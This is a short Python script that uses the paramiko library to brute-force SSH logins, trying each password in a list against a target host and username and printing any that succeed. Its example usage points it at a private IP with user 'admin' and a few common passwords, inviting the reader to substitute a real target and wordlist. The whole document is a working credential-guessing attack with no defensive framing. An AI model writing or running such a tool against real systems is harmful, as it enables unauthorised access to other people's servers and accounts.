import paramiko

def ssh_brute_force(target, username, password_list):
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password)
            print(f"Success! Username: {username}, Password: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"Failed: {password}")
        except Exception as e:
            print(f"Error: {e}")
    print("Brute force failed.")

# Example usage
target = "192.168.1.1"  # Replace with your target IP
username = "admin"
password_list = ["123456", "password", "admin123"]  # Replace with your password list
ssh_brute_force(target, username, password_list)
